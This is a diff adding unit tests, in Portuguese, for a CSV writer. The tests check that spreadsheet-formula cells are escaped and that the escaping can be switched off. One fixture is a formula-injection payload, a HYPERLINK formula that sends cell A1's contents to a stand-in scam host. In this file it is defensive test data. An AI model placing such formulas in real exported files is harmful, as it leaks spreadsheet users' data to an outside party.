@@ -7,6 +7,7 @@ import { JsonSource } from "../../io/json/jsonSource";
 import { CsvSink } from "../../io/csv/csvSink";
 import { JsonSink } from "../../io/json/jsonSink";
 import { extraOutputPath, slugify } from "../../io/files";
+import { silentLogger } from "../../logger";
 
 function tempDir(): string {
     return fs.mkdtempSync(path.join(os.tmpdir(), "etl-teste-"));
@@ -180,5 +181,45 @@ describe("CsvSink e JsonSink", () => {
         expect(extraOutputPath("saida/resultado.csv", undefined)).toBe(
             "saida/resultado.csv",
         );
+    });
+});
+
+describe("fórmula no CSV", () => {
+    it("desarma célula que o Excel leria como fórmula, mas deixa número em paz", async () => {
+        const file = path.join(
+            fs.mkdtempSync(path.join(os.tmpdir(), "datera-formula-")),
+            "saida.csv",
+        );
+        await new CsvSink({ path: file, bom: false }, silentLogger).write([
+            {
+                nome: '=HYPERLINK("http://golpe.com?"&A1;"clique")',
+                "=1+1": "@SOMA(1)",
+                telefone: "+55 53 99999-0000",
+                saldo: "-12,50",
+                aulas: -3,
+            },
+        ]);
+
+        const [cabecalho, linha] = fs
+            .readFileSync(file, "utf-8")
+            .trim()
+            .split("\r\n");
+        expect(cabecalho).toBe("nome,'=1+1,telefone,saldo,aulas");
+        expect(linha).toBe(
+            `"'=HYPERLINK(""http://golpe.com?""&A1;""clique"")",'@SOMA(1),'+55 53 99999-0000,"-12,50",-3`,
+        );
+    });
+
+    it("dá pra desligar com escapeFormulas false", async () => {
+        const file = path.join(
+            fs.mkdtempSync(path.join(os.tmpdir(), "datera-formula-")),
+            "saida.csv",
+        );
+        await new CsvSink(
+            { path: file, bom: false, escapeFormulas: false },
+            silentLogger,
+        ).write([{ conta: "=1+1" }]);
+
+        expect(fs.readFileSync(file, "utf-8")).toBe("conta\r\n=1+1\r\n");
     });
 });
